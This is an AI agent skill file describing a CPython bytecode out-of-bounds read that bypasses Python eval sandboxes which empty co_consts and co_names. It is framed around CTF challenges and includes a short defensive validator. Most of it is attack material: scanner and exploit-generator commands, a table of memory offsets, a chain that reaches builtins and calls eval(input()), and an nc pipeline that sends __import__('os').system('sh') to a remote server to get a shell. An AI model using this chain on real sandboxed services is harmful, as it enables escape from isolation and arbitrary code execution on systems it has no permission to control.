---
name: python-bytecode-oob-exploit
description: Python bytecode OOB (out-of-bounds) read exploit for sandbox bypass. Use this skill whenever the user mentions Python sandbox bypass, bytecode manipulation, CTF challenges with Python eval restrictions, co_consts/co_names manipulation, or any Python security challenge involving code object modification. This skill helps scan for OOB indexes, generate exploits, and validate sandboxes defensively.
---

# Python Bytecode OOB Exploit

A skill for exploiting CPython's LOAD_NAME/LOAD_CONST out-of-bounds read vulnerability to bypass Python sandboxes.

## When to Use This Skill

Use this skill when:
- You're working on a CTF challenge with Python eval restrictions
- You need to bypass a Python sandbox that manipulates code objects
- You encounter `co_consts=()` or `co_names=()` restrictions
- You need to understand Python bytecode OOB read vulnerabilities
- You want to validate Python sandboxes defensively

## Core Concept

CPython bytecode opcodes like `LOAD_NAME` and `LOAD_CONST` index into `co_names` and `co_consts` tuples. If these tuples are empty or smaller than the maximum index used by bytecode, the interpreter reads out-of-bounds memory, yielding arbitrary PyObject pointers from nearby memory.

### Vulnerable Opcodes (Python 3.11-3.13)

- `LOAD_CONST consti` → reads `co_consts[consti]`
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → read names from `co_names[...]`

**Note**: Python 3.11+ introduced adaptive/inline caches. When handcrafting bytecode, account for cache entries when building `co_code`.

## Workflow

### Step 1: Scan for Useful OOB Indexes

Use the scanner script to find interesting objects at specific memory offsets:

```bash
python scripts/scan_oob_indexes.py --range 0-3000 --type name
python scripts/scan_oob_indexes.py --range 0-3000 --type const
```

The scanner probes `co_consts[i]` or `co_names[i]` with empty tuples to trigger OOB reads.

### Step 2: Generate Exploit Payload

Once you have useful offsets, generate an exploit:

```bash
python scripts/generate_exploit.py --offsets "__getattribute__:2850,keys:792,builtins:798" --output exploit.py
```

### Step 3: Test the Exploit

```bash
(python exploit.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
```

## Exploit Pattern

The core exploit chain:

```python
# Get __getattribute__ via OOB read
getattr = (None).__getattribute__('__class__').__getattribute__

# Get builtins module
builtins = getattr(
  getattr(
    getattr(
      [].__getattribute__('__class__'),
    '__base__'),
  '__subclasses__'
  )()[-2],
'__repr__').__getattribute__('__globals__')['builtins']

# Execute arbitrary code
builtins['eval'](builtins['input']())
```

## Defensive Validation

If you're writing a Python sandbox, validate code objects before execution:

```bash
python scripts/validate_sandbox.py --code-object <path-to-code>
```

Or use the validation function in your sandbox:

```python
from scripts.validate_sandbox import validate_code_object

c = compile(source, '<sandbox>', 'exec')
c = c.replace(co_consts=(), co_names=())
validate_code_object(c)  # Raises ValueError if OOB access possible
eval(c, {'__builtins__': {}})
```

## Common Offsets (Python 3.11-3.13)

These offsets may vary by Python version and build:

| Name | Offset |
|------|--------|
| `__delitem__` | 2800 |
| `__getattribute__` | 2850 |
| `__dir__` | 4693 |
| `__repr__` | 2128 |
| `keys` | 792 |
| `keys2` | 793 |
| `None_` | 794 |
| `NoneType` | 795 |
| `globals` | 796 |
| `builtins` | 798 |

## Example Challenge

**Challenge**: You're given this sandbox:

```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```

**Solution**:

1. Scan for offsets: `python scripts/scan_oob_indexes.py --range 0-5000`
2. Generate exploit: `python scripts/generate_exploit.py`
3. Run: `(python exploit.py; echo '__import__("os").system("sh")'; cat -) | nc target port`

## Tips

- Use `EXTENDED_ARG` for indexes >255
- Python 3.11+ requires `RESUME` opcode at start of bytecode
- Account for inline cache entries when building `co_code`
- The technique works on CPython 3.11, 3.12, and 3.13
- For smaller payloads, use bytecode-only patterns with stack ops

## References

- Splitline's HITCON CTF 2022 writeup: https://blog.splitline.tw/hitcon-ctf-2022/
- Python disassembler docs: https://docs.python.org/3.13/library/dis.html
